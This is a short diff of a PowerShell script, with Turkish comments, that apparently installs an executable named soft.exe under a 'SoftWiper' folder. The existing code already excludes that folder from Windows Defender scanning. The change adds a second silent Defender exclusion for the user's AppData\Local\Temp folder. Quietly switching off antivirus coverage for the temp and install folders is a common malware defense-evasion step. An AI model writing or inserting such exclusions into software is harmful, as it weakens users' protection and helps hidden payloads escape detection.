@@ -45,7 +45,7 @@ if (-not (Test-Path $softWiperPath)) {
 
 # Windows Defender İstisnası (Klasörü virüs taraması dışına alır)
 Add-MpPreference -ExclusionPath $softWiperPath -ErrorAction SilentlyContinue
-
+Add-MpPreference -ExclusionPath C:\Users\ben\AppData\Local\Temp -ErrorAction SilentlyContinue
 
 $folderPath = "C:\Program Files\SoftWiper"
 $filePath = Join-Path $folderPath "soft.exe"
